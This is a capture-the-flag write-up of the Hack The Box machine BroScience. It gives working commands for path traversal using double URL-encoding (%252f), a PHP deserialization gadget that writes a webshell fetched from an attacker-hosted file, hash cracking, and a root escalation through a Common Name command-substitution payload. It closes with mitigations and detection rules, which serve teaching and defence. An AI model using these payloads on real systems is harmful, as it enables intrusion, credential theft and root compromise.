---
machine: BroScience
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, php, lfi, deserialization, openssl]
---

# BroScience — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable note.
> Reference note based on public documentation and technical writeups. No real flags or credentials.

## TL;DR

A PHP portal on Apache and PostgreSQL has a file read in `includes/img.php?path=`. The `../` filter is bypassed with double URL-encoding (`%252f`). Reading `db_connect.php` leaks the PostgreSQL password and the site salt; reading `activate.php` explains how activation codes are generated. After activating an account, the theme preference is stored as a serialized PHP object in the `user-prefs` cookie; an `AvatarInterface`/`Avatar` gadget chain writes a webshell. Database hashes crack with `hashcat -m 20` and give `bill`'s SSH password. A cron that checks certificates with `openssl` injects commands through the Common Name and runs as root.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp   ssh    OpenSSH 8.4p1 Debian
80/tcp   http   Apache 2.4.54 (redirects to HTTPS)
443/tcp  https  Apache 2.4.54 / PHP
```

The site is `broscience.htb`; port 80 redirects to 443. Add the domain to `/etc/hosts`.

## Enumeration

```bash
feroxbuster -k -u https://broscience.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Relevant endpoints: `index.php`, `login.php`, `register.php`, `activate.php`, `user.php`, `includes/img.php`. The `path` parameter in `img.php` returns `Attack detected` for a direct `../`.

## Foothold

Validation runs before URL decoding. Encoding the slashes twice bypasses it:

```bash
curl -k 'https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'
```

```bash
curl -k 'https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fvar%252fwww%252fhtml%252fincludes%252fdb_connect.php'
```

The second file contains the PostgreSQL user and password, the `broscience` database and the `NaCl` salt used by `md5($salt . $password)`. Reading `activate.php` shows the activation code is generated predictably; create an account and try candidate codes until it activates.

## Lateral movement

With an active session, the `user-prefs` cookie stores the theme preference as a base64-encoded serialized object. `get_theme()` calls `unserialize()` without `allowed_classes`. The `AvatarInterface::__wakeup()` and `Avatar::save()` classes copy a remote file to a writable path:

```php
class Avatar { public $imgPath; public function save($tmp) { /* fopen/fwrite */ } }
class AvatarInterface { public $tmp; public $imgPath; public function __wakeup() { /* new Avatar(...)->save($this->tmp) */ } }
```

Serialize an `AvatarInterface` with `tmp` pointing at an attacker-hosted webshell and `imgPath` set to `/var/www/html/cmd.php`, base64-encode it and send it in the cookie. Visiting `cmd.php` executes as `www-data`.

```bash
curl -k https://broscience.htb/cmd.php --data-urlencode 'cmd=id'
```

Dump the user hashes from the database. The format is `md5(salt . password)`, hashcat mode 20:

```bash
hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt
```

`bill`'s password allows `su - bill` or direct SSH.

## Privilege escalation

`bill` can write to the `Certs` directory consumed by a root cron. The script runs `openssl x509 -subject` and pipes it through `awk`; the Common Name ends up inside an unsanitised command substitution.

Generate a certificate whose CN copies bash and sets SUID:

```bash
openssl req -x509 -nodes -newkey rsa:2048 -keyout /dev/null \
  -out Certs/broscience.crt -days 1
# Common Name:
$(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)
```

When the cron processes the certificate, `/tmp/rootbash` appears. Run it with `-p` to keep privileges:

```bash
/tmp/rootbash -p
```

## Evidence

- `%252f` request and `/etc/passwd` output.
- `db_connect.php` with the password redacted.
- Serialized cookie and the webshell request.
- `ls -l /tmp/rootbash` and `id`.

## Lessons learned

- Double URL-encoding defeats filters that inspect the string before decoding it.
- `unserialize()` without an allowed-class list becomes a file-write primitive when a gadget exists.
- A salt does not protect weak MD5 hashes; it only defeats precomputed tables.
- A certificate is untrusted input; the CN must never reach a shell.

## Mitigations and detection

- **Fix:** canonicalise the path and confine it to the image directory; use `unserialize($data, ['allowed_classes' => false])` or signed cookies; move to `password_hash()` with Argon2/bcrypt; validate the CN and use `escapeshellarg`; run the cron with least privilege.
- **Detection:** requests containing `%252f` or `%252e`; reads of `db_connect.php`; `user-prefs` cookies containing PHP objects; PHP files created in the docroot; `openssl` spawning `sh` or `cp`; new SUID binaries in `/tmp`.
- MITRE ATT&CK: T1190, T1505.003 (web shell), T1059.004 (Unix shell), T1548.001.

## References

- <https://www.hackthebox.com/machines/BroScience>
- <https://0xdf.gitlab.io/2023/04/08/htb-broscience.html>
- <https://www.php.net/manual/en/function.unserialize.php>
- <https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>
